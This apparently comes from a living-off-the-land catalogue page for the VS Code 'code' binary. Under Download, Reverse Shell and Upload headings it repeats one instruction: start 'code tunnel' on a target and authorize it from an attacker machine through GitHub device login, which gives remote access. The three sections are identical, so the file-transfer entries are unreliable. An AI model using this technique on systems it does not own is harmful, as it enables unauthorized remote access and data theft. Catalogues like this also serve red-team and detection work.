title: code
html:
code

Download

This requires a valid GitHub account. Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

code tunnel --name xxxxxx

Reverse Shell

This requires a valid GitHub account. Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

code tunnel --name xxxxxx

Upload

This requires a valid GitHub account. Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

code tunnel --name xxxxxx
